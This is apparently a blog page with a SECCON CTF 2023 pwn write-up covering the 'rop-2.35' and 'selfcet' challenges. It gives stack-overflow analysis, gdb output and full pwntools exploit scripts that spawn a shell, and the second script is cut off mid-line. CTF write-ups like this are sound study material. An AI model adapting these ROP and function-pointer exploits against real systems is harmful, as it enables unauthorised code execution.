<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/5/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/08/SECCONCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/08/SECCONCTF2023/" class="post-title-link" itemprop="url">SECCONCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-08 12:50:00 / Modified: 12:51:34" itemprop="dateCreated datePublished" datetime="2023-10-08T12:50:00+08:00">2023-10-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>21k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>19 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="rop-2-35"><a href="#rop-2-35" class="headerlink" title="rop-2.35"></a>rop-2.35</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">chall: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">71b</span>daa4e6af292c2f768dad63ba43949ee801dcb, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>简单栈溢出：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo Enter something:&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> gets(buf, argv);</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>先起一个 docker，执行如下命令拷贝 libc 文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker cp <span class="number">61</span>a471ee750d:/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span> . </span><br></pre></td></tr></table></figure>
<p>先给出一个简单的脚本：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system_maigc = <span class="number">0x401169</span></span><br><span class="line">payload =<span class="string">&quot;sh\x00&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x15</span>+p64(system_maigc)</span><br><span class="line">sla(<span class="string">&quot;something:&quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>唯一一个需要解决的问题就是 system 报错：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7de3963</span>    movaps xmmword ptr [rsp], xmm1</span><br><span class="line">  <span class="number">0x7ffff7de3967</span>    lock cmpxchg dword ptr [rip + <span class="number">0x1cae11</span>], edx</span><br><span class="line">  <span class="number">0x7ffff7de396f</span>    jne    <span class="number">0x7ffff7de3c20</span>                &lt;<span class="number">0x7ffff7de3c20</span>&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>该汇编指令的含义为：从 xmm1 拷贝16字节的数据到 RSP</li>
<li>movaps xmmword 会检查栈是否对齐</li>
</ul>
<p>解决完这个段错误后，system 还有可能不会执行，这是由于 RSP 上的地址最终指向了非“0”区域</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x7fffffffdc80</span> —▸ <span class="number">0x403e00</span> ◂— <span class="number">0x0</span> <span class="comment">/* 合法 */</span></span><br><span class="line">*RSP  <span class="number">0x7fffffffdc50</span> ◂— <span class="number">0x100000000</span> <span class="comment">/* 不合法 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以通过调整 <code>gadget ret</code> 的数目来调整 RSP 使其满足条件</li>
</ul>
<p>另外写入的 <code>ret</code> 也不能过多，否则会破坏其后的关键数据（环境变量等）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./chall1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x401184\nb* 0x40116C\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">start_addr = <span class="number">0x401070</span></span><br><span class="line">main_addr = <span class="number">0x401182</span></span><br><span class="line">system_got = <span class="number">0x404018</span></span><br><span class="line">system_maigc = <span class="number">0x401169</span></span><br><span class="line">bss_addr = <span class="number">0x404600</span></span><br><span class="line">gets_plt = <span class="number">0x401060</span></span><br><span class="line">gets_maigc = <span class="number">0x401171</span></span><br><span class="line">add_rsp_ret = <span class="number">0x0000000000401016</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&quot;sh\x00&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)+<span class="string">&quot;\x00&quot;</span>*<span class="number">0x10</span>+p64(ret)*<span class="number">30</span>+p64(system_maigc)</span><br><span class="line">sla(<span class="string">&quot;something:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="selfcet"><a href="#selfcet" class="headerlink" title="selfcet"></a>selfcet</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.35</span><span class="number">-0u</span>buntu3<span class="number">.1</span>)</span> stable release version 2.35.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor</span>: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">6351f</span>884825de925635334fd77a7aa091b2a8de2, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Full RELRO，Canary，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>栈溢出漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">read_member(&amp;cxt, <span class="number">0LL</span>, <span class="number">0x58</span>uLL);</span><br><span class="line">read_member(&amp;cxt, <span class="number">0x20</span>LL, <span class="number">0x58</span>uLL);</span><br></pre></td></tr></table></figure>
<p>可以覆盖函数指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( cxt-&gt;status )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( _byteswap_ulong(*(_DWORD *)cxt-&gt;func) != <span class="number">0xF30F1EFA</span> )</span><br><span class="line">    BUG();</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(_QWORD, <span class="keyword">char</span> *))cxt-&gt;func)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)cxt-&gt;status, cxt-&gt;error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>位于 <code>cxt-&gt;func</code> 的函数指针可以被覆盖，但对覆盖后的地址有一定的检查，经过查找只有以下4处地址符合条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -t dword <span class="number">0xFA1E0FF3</span></span><br><span class="line">Searching <span class="keyword">for</span> value: b<span class="number">&#x27;</span>\xf3\x0f\x1e\xfa<span class="number">&#x27;</span></span><br><span class="line">xor1            <span class="number">0x401000</span> endbr64 </span><br><span class="line">xor1            <span class="number">0x4010c0</span> endbr64 </span><br><span class="line">xor1            <span class="number">0x4010f0</span> endbr64 </span><br><span class="line">xor1            <span class="number">0x4012b0</span> endbr64 </span><br></pre></td></tr></table></figure>
<p>还有一种方法就是将 err 覆盖低位变为其他 libc function，其中最好的目标就是 puts：（爆破概率为 1/4096）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffff7e13ed0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffff7e13ed0</span> (<span class="built_in">puts</span>) ◂— endbr64 </span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffff7e13ed8</span> (<span class="built_in">puts</span>+<span class="number">8</span>) ◂— push   r12</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffff7e13ee0</span> (<span class="built_in">puts</span>+<span class="number">16</span>) ◂— sub    esp, <span class="number">0x10</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffff7e13ee8</span> (<span class="built_in">puts</span>+<span class="number">24</span>) ◂— mov    r13, qword ptr [rip</span><br></pre></td></tr></table></figure>
<p>但如果最后要打 system 会遇到莫名其妙的错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">► <span class="number">0x7ffff7e7e0f0</span> &lt;execve&gt;       endbr64 </span><br><span class="line">  <span class="number">0x7ffff7e7e0f4</span> &lt;execve+<span class="number">4</span>&gt;     mov    eax, <span class="number">0x3b</span></span><br><span class="line">  <span class="number">0x7ffff7e7e0f9</span> &lt;execve+<span class="number">9</span>&gt;     syscall </span><br></pre></td></tr></table></figure>
<ul>
<li>返回值为 0xfffffffffffffff2，表示一个未定义的错误</li>
<li>猜测大概率是环境变量的问题</li>
</ul>
<p>想要解决这个问题就要直接执行 execve，并将环境变量设置为 “0”，但由于程序使用 edi 导致 libc 中的 <code>/bin/sh</code> 地址不能写入：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00000000004011</span>A8 <span class="number">89</span> C7                         mov     edi, eax</span><br><span class="line">.text:<span class="number">00000000004011</span>AA B8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">00000000004011</span>AF FF D1                         call    rcx</span><br></pre></td></tr></table></figure>
<p>因此这里先选择用 <code>libc_start_main</code> 重新执行程序，然后通过 gets 往可控地址中写入 <code>/bin/sh</code>，最后执行一个 execve 就可以了</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./xor1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b* 0x4011AF\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x401209</span></span><br><span class="line">bss_addr = <span class="number">0x404010</span> + <span class="number">0x100</span></span><br><span class="line">write_got = <span class="number">0x403FD0</span></span><br><span class="line">strcspn_got = <span class="number">0x403FE0</span></span><br><span class="line">magic_addr = <span class="number">0x4010F0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">0x20</span>+<span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>+p64(write_got)+p64(write_got)+p16(<span class="number">0x3ed0</span>)+p8(<span class="number">0xe1</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x114a20</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system_libc = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">execve_libc = libc_base + libc.sym[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line">libc_start_main = libc_base + libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">write_libc = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">printf_libc = libc_base + libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">gets_libc = libc_base + libc.sym[<span class="string">&quot;gets&quot;</span>]</span><br><span class="line">puts_libc = libc_base + libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">dup2_libc = libc_base + libc.sym[<span class="string">&quot;dup2&quot;</span>]</span><br><span class="line">bin_sh_libc = libc_base + <span class="number">0x1d8698</span></span><br><span 